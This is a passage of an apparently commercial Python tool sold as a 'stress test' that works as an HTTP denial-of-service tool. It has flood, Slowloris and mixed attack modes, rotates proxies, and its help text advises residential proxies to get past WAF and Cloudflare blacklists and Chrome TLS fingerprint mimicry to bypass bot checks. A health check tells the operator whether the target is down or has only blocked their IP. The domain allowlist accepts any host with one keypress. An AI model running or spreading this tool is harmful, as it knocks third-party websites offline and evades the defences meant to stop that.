            + paint(f"  ok={stats.ok}", Color.GREEN)
            + paint(f"  fail={stats.fail}", Color.RED)
        )
        sys.stdout.write(line)
        sys.stdout.flush()
        if done >= stats.total:
            break
        await asyncio.sleep(0.1)
    print()

# ======================================================================
#  Engine
# ======================================================================
async def engine(url, method, concurrency, total, timeout_s,
                 verify_tls, use_proxy, rand_path, verbose,
                 mode=MODE_STRESS, hold_sec=30, max_retries=1):

    sem     = asyncio.Semaphore(concurrency)
    stats   = Stats(total)
    ssl_ctx = make_ssl_context(verify_tls) if urlparse(url).scheme == "https" else None

    tasks = []

    if mode == MODE_SLOW:
        tasks = [
            asyncio.create_task(
                worker_slow(url, sem, stats, hold_sec, verbose, ssl_ctx)
            )
            for _ in range(total)
        ]

    elif mode == MODE_FLOOD:
        tout_c = min(timeout_s, 5.0)
        tasks  = [
            asyncio.create_task(
                worker_flood(url, method, sem, stats, tout_c,
                             use_proxy, rand_path, verbose, ssl_ctx)
            )
            for _ in range(total)
        ]

    else:
        conn = TCPConnector(
            ssl=ssl_ctx, limit=0, limit_per_host=0,
            ttl_dns_cache=300, use_dns_cache=True,
            enable_cleanup_closed=True, keepalive_timeout=30,
        )
        to = ClientTimeout(
            total=timeout_s,
            connect=min(5.0, timeout_s * 0.4),
            sock_read=timeout_s,
        )
        async with ClientSession(connector=conn,
                                 skip_auto_headers=["User-Agent"]) as session:
            if mode == MODE_MIXED:
                half   = total // 2
                tout_c = min(timeout_s, 5.0)
                tasks  = [
                    asyncio.create_task(
                        worker_stress(session, url, method, sem, stats, to,
                                      use_proxy, rand_path, verbose,
                                      max_retries, ssl_ctx)
                    )
                    for _ in range(half)
                ] + [
                    asyncio.create_task(
                        worker_flood(url, method, sem, stats, tout_c,
                                     use_proxy, rand_path, verbose, ssl_ctx)
                    )
                    for _ in range(total - half)
                ]
            else:
                tasks = [
                    asyncio.create_task(
                        worker_stress(session, url, method, sem, stats, to,
                                      use_proxy, rand_path, verbose,
                                      max_retries, ssl_ctx)
                    )
                    for _ in range(total)
                ]

            if verbose:
                await asyncio.gather(*tasks, return_exceptions=True)
            else:
                await asyncio.gather(
                    asyncio.create_task(show_progress(tasks, stats, mode)),
                    asyncio.gather(*tasks, return_exceptions=True),
                )
            return stats

    if verbose:
        await asyncio.gather(*tasks, return_exceptions=True)
    else:
        await asyncio.gather(
            asyncio.create_task(show_progress(tasks, stats, mode)),
            asyncio.gather(*tasks, return_exceptions=True),
        )
    return stats

# ======================================================================
#  Smart Health Check
#  Distinguishes between three states:
#    DOWN_GLOBAL   - server unreachable for everyone
#    BLOCKED_YOU   - server blocked your IP; others can still reach it
#    DEGRADED      - server up but slow / returning 5xx
#    UP            - server fully operational
# ======================================================================
async def _tcp_check(host, port, timeout=5.0) -> bool:
    try:
        _, w = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout,
        )
        w.close()
        return True
    except Exception:
        return False

async def _http_check_direct(url, ssl_ctx, timeout=8.0) -> dict:
    try:
        conn = TCPConnector(ssl=ssl_ctx, limit=4)
        to   = ClientTimeout(total=timeout)
        async with ClientSession(connector=conn) as s:
            t0 = time.perf_counter()
            async with s.get(url, timeout=to, allow_redirects=True,
                             headers={"User-Agent": random.choice(UA_POOL)}) as r:
                await r.read()
                ms = (time.perf_counter() - t0) * 1000.0
                return {"ok": True, "status": r.status, "ms": round(ms, 1), "via": "direct"}
    except asyncio.TimeoutError:
        return {"ok": False, "status": None, "ms": None, "err": "Timeout", "via": "direct"}
    except Exception as e:
        return {"ok": False, "status": None, "ms": None, "err": type(e).__name__, "via": "direct"}

async def _http_check_via_proxy(url, proxy_url, ssl_ctx, timeout=10.0) -> dict:
    try:
        conn = TCPConnector(ssl=ssl_ctx, limit=4)
        to   = ClientTimeout(total=timeout)
        async with ClientSession(connector=conn) as s:
            t0 = time.perf_counter()
            async with s.get(url, proxy=proxy_url, timeout=to, allow_redirects=True,
                             headers={"User-Agent": random.choice(UA_POOL)}) as r:
                await r.read()
                ms = (time.perf_counter() - t0) * 1000.0
                return {"ok": True, "status": r.status, "ms": round(ms, 1), "via": "proxy"}
    except Exception as e:
        return {"ok": False, "status": None, "ms": None, "err": type(e).__name__, "via": "proxy"}

async def smart_health_check(url: str, verify_tls: bool) -> dict:
    parsed  = urlparse(url)
    host    = parsed.hostname or ""
    port    = parsed.port or (443 if parsed.scheme == "https" else 80)
    ssl_ctx = make_ssl_context(verify_tls) if parsed.scheme == "https" else None

    # 1) TCP-level check (no HTTP, no proxy — pure port reachability)
    tcp_ok = await _tcp_check(host, port, timeout=6.0)

    # 2) HTTP via proxy (different IP than attacker)
    proxy_result = None
    proxy_url    = PROXY.next()
    if proxy_url:
        proxy_result = await _http_check_via_proxy(url, proxy_url, ssl_ctx, timeout=12.0)

    # 3) HTTP direct (attacker's IP)
    direct_result = await _http_check_direct(url, ssl_ctx, timeout=8.0)

    # -- classify --------------------------------------------------------
    proxy_up   = proxy_result and proxy_result["ok"] and proxy_result["status"] < 500
    direct_ok  = direct_result["ok"] and (direct_result.get("status") or 0) < 500
    direct_err = not direct_result["ok"] or (direct_result.get("status") or 0) >= 500

    if not tcp_ok:
        verdict = "DOWN_GLOBAL"
        detail  = "TCP port unreachable — server is offline or behind a firewall."
    elif proxy_up and direct_err:
        verdict = "BLOCKED_YOU"
        detail  = (
            f"Proxy reached it ({proxy_result['status']} in {proxy_result['ms']}ms) "
            f"but your IP was blocked (direct: {direct_result.get('err','err')}).\n"
            "  Server is RUNNING NORMALLY for other users."
        )
    elif proxy_up or direct_ok:
        s  = (proxy_result or direct_result).get("status", 0)
        ms = (proxy_result or direct_result).get("ms", 0)
        if s and s >= 500:
            verdict = "DEGRADED"
            detail  = f"HTTP {s}  |  {ms}ms  — server is overloaded or crashing."
        else:
            verdict = "UP"
            detail  = f"HTTP {s}  |  {ms}ms  — responding normally."
    else:
        verdict = "DOWN_GLOBAL"
        detail  = "Both direct and proxy checks failed — server appears globally unreachable."

    return {
        "verdict"       : verdict,
        "detail"        : detail,
        "tcp_open"      : tcp_ok,
        "direct"        : direct_result,
        "proxy"         : proxy_result,
    }

# ======================================================================
#  Save results
# ======================================================================
def save_result(url, dt, stats, rps, hc, mode):
    try:
        RESULTS_DIR.mkdir(exist_ok=True)
        fname = RESULTS_DIR / f"result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        fname.write_text(json.dumps({
            "url"        : url,
            "mode"       : mode,
            "duration_s" : round(dt, 2),
            "sent"       : stats.sent(),
            "ok"         : stats.ok,
            "fail"       : stats.fail,
            "retried"    : stats.retried,
            "rps"        : round(rps, 1),
            "latency"    : {
                "avg": round(stats.avg(), 1),
                "p50": round(stats.pct(50), 1),
                "p95": round(stats.pct(95), 1),
                "p99": round(stats.pct(99), 1),
            },
            "codes"        : stats.codes,
            "errors"       : stats.errors,
            "health_after" : hc,
            "timestamp"    : datetime.now().isoformat(),
        }, indent=2), "utf-8")
    except Exception:
        pass

# ======================================================================
#  Results screen
# ======================================================================
def print_results(url, dt, stats, method, used_proxy, verify_tls, mode):
    clr()
    sent = stats.sent()
    rps  = sent / dt if dt > 0 else 0.0
    ip   = resolve_ip(url)

    print(div())
    print(paint(f"  TEST COMPLETE  --  {TOOL_NAME} {VERSION}", Color.BOLD, Color.GREEN))
    print(div())
    print(paint(f"  Target   : {url}", Color.CYAN))
    print(paint(f"  IP       : {ip}", Color.DIM))
    print(paint(f"  Mode     : {mode}", Color.PURPLE))
    print(paint(f"  Method   : {method}", Color.CYAN))
    print(paint(f"  Proxy    : {'enabled (' + str(PROXY.count()) + ')' if used_proxy else 'direct'}", Color.CYAN))
    print(paint(f"  Duration : {dt:.2f}s", Color.CYAN))
    print(div("-", 72, Color.DIM))

    ok_p   = stats.ok   / sent * 100 if sent else 0.0
    fail_p = stats.fail / sent * 100 if sent else 0.0
    print(paint(f"  Total    : {sent}", Color.WHITE))
    print(paint(f"  Success  : {stats.ok}  ({ok_p:.1f}%)", Color.GREEN))
    print(paint(f"  Failed   : {stats.fail}  ({fail_p:.1f}%)", Color.RED))
    if stats.retried:
        print(paint(f"  Retried  : {stats.retried}  (auto-fallback to direct)", Color.YELLOW))
    print(paint(f"  RPS      : {rps:.1f} req/s", Color.YELLOW, Color.BOLD))
    print(div("-", 72, Color.DIM))

    if stats.lat:
        print(paint("  Latency (ms)", Color.PURPLE))
        print(
            f"    min={min(stats.lat):.0f}"
            f"  avg={stats.avg():.0f}"
            f"  p50={stats.pct(50):.0f}"
            f"  p75={stats.pct(75):.0f}"
            f"  p90={stats.pct(90):.0f}"
            f"  p95={stats.pct(95):.0f}"
            f"  p99={stats.pct(99):.0f}"
            f"  max={max(stats.lat):.0f}"
        )
        print(div("-", 72, Color.DIM))

    if stats.codes:
        print(paint("  HTTP Status Codes", Color.BLUE))
        for code in sorted(stats.codes):
            cnt = stats.codes[code]
            bar = "#" * min(28, max(1, cnt * 28 // max(1, sent)))
            col = Color.GREEN if code < 400 else (Color.YELLOW if code < 500 else Color.RED)
            print(paint(f"    {code}: {cnt:>8}  {bar}", col))
        print(div("-", 72, Color.DIM))

    if stats.errors:
        print(paint("  Error Breakdown", Color.RED))
        total_errs = sum(stats.errors.values())
        for name, cnt in sorted(stats.errors.items(), key=lambda x: -x[1])[:10]:
            pct = cnt / total_errs * 100 if total_errs else 0.0
            bar = "#" * min(20, max(1, cnt * 20 // max(1, total_errs)))
            print(paint(f"    {name:<30} {cnt:>6} ({pct:4.1f}%)  {bar}", Color.DIM))
        print(div("-", 72, Color.DIM))

    print(paint("  Running smart health check ...", Color.DIM))
    hc = asyncio.run(smart_health_check(url, verify_tls))
    save_result(url, dt, stats, rps, hc, mode)

    verdict = hc.get("verdict", "UNKNOWN")
    detail  = hc.get("detail", "")

    print(paint("  Target Status After Test", Color.BLUE))
    if verdict == "DOWN_GLOBAL":
        print(paint("  [DOWN GLOBALLY]", Color.RED, Color.BOLD))
        print(paint(f"              {detail}", Color.DIM))
    elif verdict == "BLOCKED_YOU":
        print(paint("  [BLOCKED YOUR IP]   Server is UP for everyone else.", Color.YELLOW, Color.BOLD))
        print(paint(f"              {detail}", Color.DIM))
    elif verdict == "DEGRADED":
        print(paint("  [DEGRADED]   Overloaded / 5xx errors.", Color.YELLOW, Color.BOLD))
        print(paint(f"              {detail}", Color.DIM))
    else:
        print(paint("  [UP]         Fully operational.", Color.GREEN, Color.BOLD))
        print(paint(f"              {detail}", Color.DIM))

    tcp_s = paint("open", Color.GREEN) if hc.get("tcp_open") else paint("closed", Color.RED)
    print(paint(f"  TCP port: {tcp_s}", Color.DIM))

    print(div())
    print(paint(f"  Results saved -> {RESULTS_DIR}", Color.DIM))
    print(paint(f"  {CONTACT}", Color.YELLOW))
    print(div())
    input(paint("  Press Enter to return...", Color.DIM))

# ======================================================================
#  Input helpers
# ======================================================================
def ask_int(prompt, default):
    try:
        v = input(prompt).strip()
        return int(v) if v else default
    except (ValueError, EOFError):
        return default

def ask_float(prompt, default):
    try:
        v = input(prompt).strip()
        return float(v) if v else default
    except (ValueError, EOFError):
        return default

def ask_yn(prompt, default):
    v = input(prompt).strip().lower()
    if not v:
        return default
    return v in ("y", "yes", "1")

# ======================================================================
#  Sub-screens
# ======================================================================
def run_test_screen(target):
    clr()
    print(BANNER)
    print(div())
    print(paint("  TEST CONFIGURATION", Color.CYAN, Color.BOLD))
    print(div("-", 72, Color.DIM))

    ok, msg = validate_target(target)
    if not ok:
        print(paint(f"\n  [ERROR] {msg}", Color.RED))
        input(paint("  Press Enter...", Color.DIM))
        return

    print(paint(f"  Target  : {target}", Color.GREEN))
    print(paint(f"  IP      : {resolve_ip(target)}", Color.DIM))
    print(div("-", 72, Color.DIM))

    print(paint("  Attack modes:", Color.CYAN))
    print(paint("    STRESS    Full HTTP exchange.  Drains worker pools + DB connections.", Color.DIM))
    print(paint("    FLOOD     Send headers only, abandon.  Fills TCP connection backlog.", Color.DIM))
    print(paint("    MIXED     STRESS + FLOOD simultaneously.  Best general-purpose choice.", Color.DIM))
    print(paint("    SLOWLORIS Hold connections open.  Blocks server worker slots over time.", Color.DIM))
    print()

    mode_in = input(paint("  Mode [STRESS/FLOOD/MIXED/SLOWLORIS] (default=MIXED): ",
                          Color.YELLOW)).strip().upper()
    mode = mode_in if mode_in in MODES else MODE_MIXED

    m_raw  = input(paint("  HTTP Method [GET/POST/HEAD] (default=GET): ",
                         Color.YELLOW)).strip().upper()
    method = m_raw if m_raw in ("GET","POST","HEAD","PUT","DELETE") else "GET"

    conc = ask_int(paint(f"  Concurrency (parallel connections) [{DEFAULT_CONC}]: ",
                         Color.YELLOW), DEFAULT_CONC)

    hold_sec = 30
    if mode == MODE_SLOW:
        hold_sec = ask_int(paint("  Hold each connection open for how many seconds? [30]: ",
                                 Color.YELLOW), 30)
        total = conc
        print(paint(f"  Total = {total} (concurrency in Slowloris mode)", Color.DIM))
    else:
        total = ask_int(paint(f"  Total requests [{DEFAULT_TOTAL}]: ", Color.YELLOW), DEFAULT_TOTAL)

    tout    = ask_float(paint(f"  Timeout seconds [{DEFAULT_TOUT}]: ", Color.YELLOW), DEFAULT_TOUT)
    retries = ask_int  (paint( "  Retries (proxy fallback) per request [1]: ", Color.YELLOW), 1)
    tls     = ask_yn   (paint( "  Verify TLS? (y/N) [N]: ", Color.YELLOW), False)
    rpath   = ask_yn   (paint( "  Random query string? (Y/n) [Y]: ", Color.YELLOW), True)
    verb    = ask_yn   (paint( "  Verbose per-request log? (y/N) [N]: ", Color.YELLOW), False)

    use_proxy = False
    if PROXY.count() > 0:
        use_proxy = ask_yn(
            paint(f"  Use proxies? ({PROXY.count()} active) (Y/n) [Y]: ", Color.YELLOW), True
        )
        if use_proxy and not PROXY.validated:
            do_val = ask_yn(
                paint("  Pre-validate proxies against target? (Y/n) [Y]: ", Color.YELLOW), True
            )
            if do_val:
                print()
                PROXY.validate(target, cb=print, max_ok=400)
                print()
    else:
        print(paint("  [!] No proxies available — sending direct.", Color.YELLOW))
        print(paint("  TIP: Add custom proxies to ~/.zaeem_custom_proxies.txt", Color.CYAN))

    # Bandwidth awareness
    print(paint("\n  Estimating upload bandwidth...", Color.DIM))
    ssl_est = make_ssl_context(False) if urlparse(target).scheme == "https" else None
    try:
        mbps = asyncio.run(estimate_upload_mbps(target, ssl_est))
    except Exception:
        mbps = 0.0
    if mbps > 0.01:
        rec = suggest_mode_for_bandwidth(mbps)
        print(paint(f"  Estimated upload: ~{mbps:.2f} MB/s", Color.CYAN))
        if rec != mode:
            print(paint(f"  Suggestion for your bandwidth: use {rec} mode.", Color.YELLOW))
    print()

    print(div())
    print(paint(f"  Launching: {mode}  {method} x{total}  conc={conc}", Color.GREEN, Color.BOLD))
    if use_proxy:
        print(paint(f"  {PROXY.summary()}", Color.DIM))
    print(div())

    t0    = time.time()
    stats = asyncio.run(
        engine(target, method, conc, total, tout, tls,
               use_proxy, rpath, verb, mode, hold_sec, retries)
    )
    dt = time.time() - t0

    print_results(target, dt, stats, method, use_proxy, tls, mode)


def proxy_screen():
    while True:
        clr()
        print(BANNER)
        print(div())
        print(paint("  PROXY MANAGEMENT", Color.CYAN, Color.BOLD))
        print(div("-", 72, Color.DIM))
        print(paint(f"  {PROXY.summary()}", Color.DIM))
        print(paint(f"  Custom proxy file: {CUSTOM_PROXY_FILE}", Color.DIM))
        print(div("-", 72, Color.DIM))
        print(paint("  [1] Load custom proxies from file", Color.GREEN))
        print(paint("  [2] Fetch public proxies (may be WAF-blacklisted)", Color.YELLOW))
        print(paint("  [3] Validate active proxies against target", Color.CYAN))
        print(paint("  [4] Show summary", Color.DIM))
        print(paint("  [5] Show custom proxy file path / format", Color.DIM))
        print(paint("  [0] Back", Color.RED))
        print(div())
        ch = input(paint("  Select: ", Color.CYAN)).strip()

        if ch == "1":
            print()
            n = PROXY.load_custom(cb=print)
            if n == 0:
                print(paint(f"  File not found or empty: {CUSTOM_PROXY_FILE}", Color.RED))
                print(paint("  Create it and add one proxy per line.", Color.DIM))
            input(paint("\n  Press Enter...", Color.DIM))
        elif ch == "2":
            print()
            PROXY.fetch_public(cb=print)
            input(paint("\n  Press Enter...", Color.DIM))
        elif ch == "3":
            url = input(paint("  Target URL to validate against: ", Color.YELLOW)).strip()
            if url:
                url = normalize_url(url)
                print()
                PROXY.validate(url, cb=print, max_ok=400)
            input(paint("\n  Press Enter...", Color.DIM))
        elif ch == "4":
            print(paint(f"\n  {PROXY.summary()}", Color.GREEN))
            print(paint(f"  Raw total: {PROXY.raw_count()}", Color.DIM))
            input(paint("  Press Enter...", Color.DIM))
        elif ch == "5":
            clr()
            print(BANNER)
            print(div())
            print(paint("  CUSTOM PROXY FILE FORMAT", Color.CYAN, Color.BOLD))
            print(div("-", 72, Color.DIM))
            print(paint(f"  Path: {CUSTOM_PROXY_FILE}", Color.GREEN))
            print()
            print(paint("  Add one proxy per line. Supported formats:", Color.WHITE))
            print(paint("    HTTP proxy      :  1.2.3.4:8080", Color.DIM))
            print(paint("    HTTP with auth  :  http://user:pass@1.2.3.4:8080", Color.DIM))
            print(paint("    SOCKS5          :  socks5://1.2.3.4:1080", Color.DIM))
            print(paint("    SOCKS5 w/ auth  :  socks5://user:pass@1.2.3.4:1080", Color.DIM))
            print(paint("    SOCKS4          :  socks4://1.2.3.4:1080", Color.DIM))
            print(paint("    Comment line    :  # this is ignored", Color.DIM))
            print()
            print(paint("  SOCKS proxies require:  pip install aiohttp-socks", Color.YELLOW))
            print()
            print(paint("  WHY custom proxies?", Color.CYAN))
            print(paint("  Public proxies are pre-listed in WAF/Cloudflare blacklists.", Color.DIM))
            print(paint("  Residential or private proxies bypass these checks entirely.", Color.DIM))
            print(div())
            input(paint("  Press Enter...", Color.DIM))
        elif ch == "0":
            break


def allowed_screen():
    clr()
    print(BANNER)
    print(div())
    hosts = load_allowed()
    if hosts:
        print(paint("  Authorized domains:", Color.GREEN))
        for h in sorted(hosts):
            print(paint(f"    * {h}", Color.CYAN))
    else:
        print(paint("  No authorized domains configured.", Color.RED))
    print(div())
    input(paint("  Press Enter...", Color.DIM))


def add_domain_screen():
    clr()
    print(BANNER)
    print(div())
    print(paint("  ADD AUTHORIZED DOMAIN", Color.CYAN, Color.BOLD))
    print(paint("  Example: example.com  (no http:// prefix)", Color.DIM))
    print(div("-", 72, Color.DIM))
    h = input(paint("  Domain: ", Color.GREEN)).strip()
    if add_allowed(h):
        print(paint(f"  [OK] Saved: {h}", Color.GREEN))
    else:
        print(paint("  [ERROR] Invalid domain.", Color.RED))
    time.sleep(0.8)


def help_screen():
    clr()
    print(BANNER)
    print(div())

    sections = {
        "ATTACK MODES": [
            ("STRESS",    "Full HTTP exchange. Drains DB connections + worker pools."),
            ("FLOOD",     "Send headers, abandon. Fills TCP backlog without bandwidth."),
            ("MIXED",     "Half STRESS + half FLOOD. Hits both TCP and app layers."),
            ("SLOWLORIS", "Hold connections open. Exhausts server worker slots slowly."),
        ],
        "PROXY GUIDE": [
            ("Custom file", f"Add paid/residential proxies to {CUSTOM_PROXY_FILE}"),
            ("Format",      "Supports http://, socks5://, socks4://, user:pass@"),
            ("Why custom",  "Public proxies are on WAF/Cloudflare blacklists already."),
            ("Validation",  "Pre-validate proxies against the real target before test."),
            ("Fallback",    "On proxy fail: auto-retries once with direct connection."),
        ],
        "BANDWIDTH": [
            ("FLOOD/SLOW",  "Use almost zero upload bandwidth. Best on slow connections."),
            ("STRESS/MIXED","Use full bandwidth. Best on fast connections (>10MB/s)."),
            ("Auto-detect", "Tool estimates your upload speed and suggests best mode."),
        ],
        "HEALTH CHECK": [
            ("TCP check",   "Tests raw port open/closed (independent of HTTP)."),
            ("Proxy check", "Tests HTTP via a proxy (different IP)."),
            ("Direct check","Tests HTTP from your IP."),
            ("BLOCKED_YOU", "Proxy OK, direct fails = your IP blocked, server still running."),
            ("DOWN_GLOBAL", "TCP closed, both checks fail = server is actually down."),
        ],
        "TLS BYPASS": [
            ("JA3 mimic",   "TLS cipher order + ALPN matches Chrome 120 ClientHello."),
            ("Sec-Fetch",   "sec-ch-ua, Sec-Fetch-Dest, Sec-Fetch-Mode headers included."),
            ("Limitation",  "Full JS challenge bypass requires a headless browser."),
        ],
        "INSTALL": [
            ("Required",    "pip install aiohttp"),
            ("Speed",       "pip install uvloop   (+50% on Linux)"),
            ("SOCKS proxy", "pip install aiohttp-socks"),
        ],
    }

    for section, items in sections.items():
        print(paint(f"  {section}", Color.YELLOW, Color.BOLD))
        for k, v in items:
            print(paint(f"    {k:<14}", Color.CYAN) + paint(v, Color.DIM))
        print()

    print(paint(f"  CONTACT: {CONTACT}", Color.WHITE))
    print(div())
    input(paint("  Press Enter...", Color.DIM))


def history_screen():
    clr()
    print(BANNER)
    print(div())
    print(paint("  RESULTS HISTORY (last 10 tests)", Color.CYAN, Color.BOLD))
    print(div("-", 72, Color.DIM))
    try:
        if not RESULTS_DIR.exists():
            print(paint("  No saved results yet.", Color.DIM))
        else:
            files = sorted(RESULTS_DIR.glob("result_*.json"), reverse=True)[:10]
            if not files:
                print(paint("  No saved results yet.", Color.DIM))
            for f in files:
                try:
                    d       = json.loads(f.read_text("utf-8"))
                    verdict = d.get("health_after", {}).get("verdict", "?")
                    color_map = {
                        "UP"          : Color.GREEN,
                        "BLOCKED_YOU" : Color.YELLOW,
                        "DEGRADED"    : Color.YELLOW,
                        "DOWN_GLOBAL" : Color.RED,
                    }
                    col     = color_map.get(verdict, Color.DIM)
                    mode_s  = d.get("mode", "?")[:8].ljust(8)
                    verdict_s = verdict[:12].ljust(12)
                    print(
                        paint(f"  [{verdict_s}]", col)
                        + paint(f" {mode_s}", Color.PURPLE)
                        + paint(f"  {d['timestamp'][:16]}  ", Color.DIM)
                        + paint(f"{d['url'][:30]}", Color.CYAN)
                        + paint(f"  rps={d.get('rps',0):5}", Color.YELLOW)
                        + paint(f"  fail={d.get('fail',0)}", Color.RED)
                    )
                except Exception:
                    pass
    except Exception:
        pass
    print(div())
    input(paint("  Press Enter...", Color.DIM))

# ======================================================================
#  Target input
# ======================================================================
def ask_target():
    print(paint(
        "\n"
        "  Enter the target:\n"
        "    IP only        ->  192.168.1.10\n"
        "    IP with port   ->  192.168.1.10:8080\n"
        "    Domain         ->  example.com\n"
        "    Full URL       ->  https://example.com/path\n",
        Color.DIM,
    ))
    while True:
        print(div("-", 72, Color.DIM))
        raw = input(paint("  >> Target (IP / URL): ", Color.GREEN, Color.BOLD)).strip()
        if not raw:
            print(paint("  [!] Cannot be empty.", Color.RED))
            continue
        url = normalize_url(raw)
        ok, msg = validate_target(url)
        if ok:
            ip = resolve_ip(url)
            print(paint(f"\n  Target set: {url}  |  IP: {ip}", Color.GREEN))
            time.sleep(0.4)
            return url
        host = urlparse(url).hostname or ""
        if host and not is_ip(host):
            print(paint(f"\n  [!] '{host}' not in allowlist.", Color.YELLOW))
            q = input(paint(f"  Add '{host}'? (y/N): ", Color.YELLOW)).strip().lower()
            if q in ("y", "yes"):
                if add_allowed(host):
                    print(paint(f"  [OK] Added: {host}", Color.GREEN))
                    time.sleep(0.3)
                    return url
        else:
            print(paint(f"\n  [!] {msg}", Color.RED))

# ======================================================================
#  Main menu
# ======================================================================
def main_menu(target):
    while True:
        clr()
        print(BANNER)
        print(div("-", 72, Color.DIM))
        print(paint(f"  Target  : {target}", Color.GREEN))
        print(paint(f"  IP      : {resolve_ip(target)}", Color.DIM))
        print(paint(f"  {PROXY.summary()}", Color.DIM))
        print(div())
        print(paint("  [1]  Start stress test", Color.GREEN))
        print(paint("  [2]  Change target", Color.CYAN))
        print(paint("  [3]  Proxy management", Color.YELLOW))
        print(paint("  [A]  Add authorized domain", Color.CYAN))
        print(paint("  [B]  Show authorized domains", Color.CYAN))
        print(paint("  [H]  Help + guide", Color.DIM))
        print(paint("  [R]  Results history", Color.DIM))
        print(paint("  [0]  Exit", Color.RED))
        print(div())
        ch = input(paint("  Select: ", Color.CYAN)).strip().upper()

        if   ch == "1": run_test_screen(target)
        elif ch == "2": target = ask_target()
        elif ch == "3": proxy_screen()
        elif ch == "A": add_domain_screen()
        elif ch == "B": allowed_screen()
        elif ch == "H": help_screen()
        elif ch == "R": history_screen()
        elif ch == "0":
            print(paint("\n  Goodbye.\n", Color.DIM))
            sys.exit(0)
        else:
            print(paint("  Invalid option.", Color.RED))
            time.sleep(0.4)

# ======================================================================
#  Entry point
# ======================================================================
def main():
    if sys.platform.startswith("win"):
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except AttributeError:
            pass

    try:
        RESULTS_DIR.mkdir(exist_ok=True)
    except Exception:
        pass

    enforce_trial()

    clr()
    print(BANNER)
    print(div())
    print(paint(DISCLAIMER, Color.YELLOW))
    print(div())
    if input(paint("  >> ", Color.GREEN)).strip() != "I AGREE":
        print(paint("  Exiting.", Color.RED))
        sys.exit(0)

    clr()
    print(BANNER)
    print(div())
    # Prefer custom proxies; fall back to public sources
    PROXY.reset_and_fetch(cb=print)
    print()
    print(div())

    target = ask_target()
    main_menu(target)


if __name__ == "__main__":
    main()
